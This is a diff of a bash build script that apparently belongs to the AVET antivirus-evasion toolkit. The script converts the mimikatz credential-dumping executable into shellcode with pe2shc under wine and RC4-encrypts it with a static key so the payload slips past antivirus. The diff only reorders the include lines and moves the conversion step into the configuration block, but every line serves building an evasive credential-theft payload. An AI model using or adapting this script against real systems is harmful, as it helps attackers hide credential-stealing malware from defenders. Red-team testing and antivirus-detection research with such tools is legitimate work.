@@ -1,15 +1,6 @@
 #!/bin/bash          
 
 
-# include script containing the compiler var $win64_compiler
-# you can edit the compiler in build/global_win64.sh
-# or enter $win64_compiler="mycompiler" here
-. build/global_win64.sh
-
-# import feature construction interface
-. build/feature_construction.sh
-
-
 #DESCRIPTION_START
 # RC4-encrypt the payload with a static, preset key.
 # Here, the mimikatz executable is used as payload, converted into shellcode format by pe_to_shellcode.
@@ -21,18 +12,26 @@
 #DESCRIPTION_END
 
 
+# include script containing the compiler var $win64_compiler
+# you can edit the compiler in build/global_win64.sh
+# or enter $win64_compiler="mycompiler" here
+. build/global_win64.sh
+
+# import feature construction interface
+. build/feature_construction.sh
+
+
 #CONFIGURATION_START
 # enable debug output
 enable_debug_print
+# convert mimikatz executable into shellcode format
+# Can be of course used with other .exe files
+wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/sc_raw.txt
 #CONFIGURATION_END
 
 
 # print AVET logo
 cat banner.txt
-
-
-# convert mimikatz executable into shellcode format
-wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/sc_raw.txt
 
 # no command preexec
 set_command_source no_data
